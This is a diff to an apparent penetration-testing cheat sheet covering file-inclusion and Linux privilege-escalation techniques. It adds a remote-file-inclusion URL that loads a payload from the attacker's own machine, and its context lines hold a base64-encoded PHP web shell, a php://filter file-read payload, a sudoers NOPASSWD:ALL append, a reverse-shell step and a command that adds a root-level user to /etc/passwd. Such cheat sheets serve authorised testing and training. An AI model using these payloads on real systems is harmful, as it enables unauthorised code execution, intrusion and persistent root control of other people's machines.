@@ -310,6 +310,13 @@ http://IP/FI?=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdK
 http://IP/FI?=php://filter/convert.base64-encode/resource=FILE
 ```
 
+Remote file inclusion is rarely enabled but it can be done in this way,
+put your payload into PAYLOAD.EXT, replace PAYLOAD to any preferred file name
+and replace .EXT to any applicable extension
+```
+http://IP/FI?=http://YOUR_KALI_IP/PAYLOAD.EXT
+```
+
 #### SMTP code injection associate with LFI to RCE
 ```bash
 #Connect to the smtp port with nc/telnet
@@ -663,7 +670,7 @@ echo "CURRENT_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 #3. Call reverse shell
 #add reverse shell payload to the script
 #4. add new privileged user to /etc/passwd
-#Create a new user password with openssl
+#Create a new user password with openssl in the target machine
 openssl passwd 123
 #append the new user to /etc/passwd in such format 
 echo "Fakeuser:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
